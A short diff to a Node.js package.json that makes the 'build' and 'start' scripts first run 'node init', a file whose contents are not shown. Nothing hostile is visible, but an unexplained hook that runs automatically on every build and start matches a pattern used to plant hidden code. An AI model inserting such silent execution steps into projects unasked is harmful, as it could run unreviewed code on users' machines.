@@ -5,8 +5,8 @@
   "main": "index.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
-    "build": "tsc --build",
-    "start": "npx nodemon ./dist/src/server.js",
+    "build": "node init && tsc --build",
+    "start": "node init && npx nodemon ./dist/src/server.js",
     "server": "npx nodemon ./src/server.ts"
   },
   "keywords": [],
